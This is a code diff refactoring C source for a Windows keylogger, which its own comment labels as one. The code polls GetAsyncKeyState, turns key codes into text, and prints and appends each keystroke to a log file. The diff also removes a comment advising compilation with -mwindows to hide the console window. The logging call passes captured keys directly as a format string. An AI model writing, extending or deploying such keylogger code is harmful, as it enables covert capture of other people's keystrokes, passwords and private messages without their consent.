@@ -2,14 +2,12 @@
 #include <windows.h>
 #include "vk.h"
 
-// compile with -mwindows to hide console
-
 // a more human readable keylogger
-bool clean = true;
+#define clean true
 
 bool isShift() { return (((1 << 15) & GetAsyncKeyState(VK_SHIFT)) ? true : false); }
 
-const char* CaptureKeyPress(const int& key, const bool& clean) {
+const char* CaptureKeyPress(const int& key) {
 	
 	switch (key) {
 		
@@ -167,20 +165,15 @@ int main(int argc, char* argv[]) {
 			// -32767 = keydown
 			// -32768 = keyup
 			if (GetAsyncKeyState(i) == -32767) {
-				
-				const char* key = CaptureKeyPress(i, clean);
+				const char* key = CaptureKeyPress(i);
 				if (key == NULL) { continue; }
-				
 				printf("%s", key);
 				fprintf(f, key);
-				
 				Sleep(10);
 			}
 		}
-		
 		fflush(f);
 	}
-	
 	fclose(f);
 	
 	return 0;
